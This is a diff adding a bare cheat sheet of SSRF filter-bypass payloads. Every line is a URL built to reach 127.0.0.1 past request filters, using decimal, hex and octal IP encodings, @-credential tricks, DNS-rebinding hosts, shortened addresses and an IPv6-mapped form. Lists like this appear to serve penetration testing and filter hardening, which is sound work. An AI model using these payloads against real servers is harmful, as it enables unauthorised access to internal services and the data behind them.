@@ -1,0 +1,25 @@
+# SSRF Filter Bypass Techniques
+
+# IP Encoding Bypasses (Localhost)
+http://2130706433 (Decimal)
+http://0x7f000001 (Hex)
+http://0177.00.00.01 (Octal)
+http://0x7f.0.0.1 (Mixed)
+
+# @ Symbol / Credentials Bypass
+http://google.com@127.0.0.1
+http://127.0.0.1#@google.com
+http://127.0.0.1:80@google.com
+
+# DNS Pinning / Rebinding
+http://7f000001.rbndr.us (DNS Rebind to 127.0.0.1)
+http://spoofed.burpcollaborator.net
+
+# CIDR Bypasses
+http://127.1
+http://127.0.1
+
+# Rare Schemes & Bypasses
+HTTPS://127.0.0.1
+http://localhost.
+http://[0:0:0:0:0:ffff:127.0.0.1]
